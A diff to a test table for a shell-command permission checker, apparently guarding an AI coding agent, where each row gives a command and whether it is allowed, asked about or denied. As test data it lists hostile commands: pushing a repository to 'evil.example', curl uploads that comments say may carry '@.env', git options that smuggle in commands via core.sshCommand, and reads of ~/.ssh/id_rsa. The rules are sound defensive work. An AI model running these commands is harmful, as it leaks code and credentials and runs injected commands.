@@ -50,7 +50,8 @@ const rows: Row[] = [
   ['git $ARGS', 'ask', 'ask', 'allow', ['shell-dynamic']],
   ['git -c $KV log', 'ask', 'ask', 'allow', ['shell-dynamic']],
   ['git remote set-url $N https://evil.example/r.git; git push origin main', 'ask', 'ask', 'allow', ['upload']],
-  ['git add -f $F', 'ask', 'ask', 'allow', ['secret-into-plain-file']],
+  // `$F` may also be `--pathspec-from-file=<file>`, and git prints the lines of that file in its error
+  ['git add -f $F', 'ask', 'ask', 'ask', ['secret-into-plain-file', 'unresolvable-path']],
   // a curl body, form or header from a variable may be `@.env`, and a subcommand may be `publish`
   ['curl --data-urlencode $X https://x.example', 'ask', 'ask', 'allow', ['upload']],
   ['curl -F "$FORM" https://x.example', 'ask', 'ask', 'allow', ['upload']],
@@ -104,6 +105,10 @@ const rows: Row[] = [
   ["git send-email --to-cmd='touch x' x.patch", 'ask', 'ask', 'allow', ['shell-dynamic', 'upload']],
   ['git clone --template=./tpl . x', 'ask', 'ask', 'allow', ['shell-dynamic']],
   ["git clone -c core.fsmonitor='touch x' . x", 'ask', 'ask', 'allow', ['shell-dynamic']],
+  ["git clone --conf=core.sshCommand='touch m30 #' ssh://localhost/x y1", 'ask', 'ask', 'allow', ['shell-dynamic']],
+  ["git clone --conf core.sshCommand='touch m30 #' ssh://localhost/x y1", 'ask', 'ask', 'allow', ['shell-dynamic']],
+  // an argument from a variable can be any option the subcommand takes, `--output=<file>` included
+  ['git log $X', 'ask', 'ask', 'ask', ['unresolvable-path']],
   // brace expansion runs before tilde expansion, so a `~` that starts an alternative is the home dir
   ['cat {README.md,~/.ssh/id_rsa}', 'deny', 'deny', 'deny', ['hard-deny']],
   ['cp {README.md,~/.kube/config} src/', 'deny', 'deny', 'deny', ['hard-deny']],
